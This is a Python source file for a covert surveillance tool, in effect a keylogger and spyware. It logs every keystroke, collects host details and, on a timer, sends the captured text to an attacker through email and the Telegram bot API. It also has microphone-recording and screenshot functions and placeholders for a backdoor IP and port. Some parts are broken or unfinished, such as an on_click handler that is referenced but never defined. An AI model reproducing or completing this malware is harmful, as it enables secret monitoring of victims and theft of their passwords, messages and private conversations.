import os
import sys
import threading
import logging
import socket
import platform
import smtplib
import ssl
import pyscreenshot
import sounddevice as sd
import wave
from pynput import keyboard, mouse
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
from cryptography.fernet import Fernet
import json

# Environment Variables for sensitive data
EMAIL_ADDRESS = os.getenv('EMAIL_USER')
EMAIL_PASSWORD = os.getenv('EMAIL_PASS')
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
FTP_CREDENTIALS = os.getenv('FTP_CREDENTIALS')

SEND_REPORT_EVERY = 86400  # 24 hours in seconds
BACKDOOR_IP = os.getenv('BACKDOOR_IP')
BACKDOOR_PORT = os.getenv('BACKDOOR_PORT')
ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY').encode()
fernet = Fernet(ENCRYPTION_KEY)

class SurveillanceTool:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.system_info = self.get_system_info()
        self.data_storage = []

    def append_log(self, string):
        self.log += string

    def get_system_info(self):
        info = {
            "hostname": socket.gethostname(),
            "ip": socket.gethostbyname(socket.gethostname()),
            "processor": platform.processor(),
            "system": platform.system(),
            "machine": platform.machine(),
        }
        return json.dumps(info)

    def on_press(self, key):
        try:
            self.append_log(str(key.char))
        except AttributeError:
            if key == key.space:
                self.append_log(" ")
            elif key == key.esc:
                self.append_log("[ESC]")
            else:
                self.append_log(" " + str(key) + " ")

    def send_data(self):
        if EMAIL_ADDRESS:
            self.send_email(self.log + "\n\n" + self.system_info)
        if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
            self.send_telegram(self.log + "\n\n" + self.system_info)
        self.log = ""
        threading.Timer(self.interval, self.send_data).start()

    def send_email(self, message):
        try:
            msg = MIMEMultipart()
            msg['From'] = EMAIL_ADDRESS
            msg['To'] = EMAIL_ADDRESS
            msg['Subject'] = 'Surveillance Data'
            msg.attach(MIMEText(message, 'plain'))

            context = ssl.create_default_context()
            with smtplib.SMTP_SSL('smtp.example.com', 465, context=context) as server:
                server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg.as_string())
        except Exception as e:
            self.append_log(f"Failed to send email: {e}")

    def send_telegram(self, message):
        try:
            import requests
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                data={"chat_id": TELEGRAM_CHAT_ID, "text": message}
            )
        except Exception as e:
            self.append_log(f"Failed to send Telegram message: {e}")

    def save_data_locally(self):
        encrypted_data = fernet.encrypt(self.log.encode())
        self.data_storage.append(encrypted_data)

    def microphone(self):
        fs = 44100
        seconds = SEND_REPORT_EVERY
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        self.data_storage.append(fernet.encrypt(myrecording.tobytes()))

    def screenshot(self):
        img = pyscreenshot.grab()
        img_data = img.tobytes()
        self.data_storage.append(fernet.encrypt(img_data))

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.send_data()
            keyboard_listener.join()
        mouse_listener = mouse.Listener(on_click=self.on_click)
        with mouse_listener:
            mouse_listener.join()

tool = SurveillanceTool(SEND_REPORT_EVERY)
tool.run()
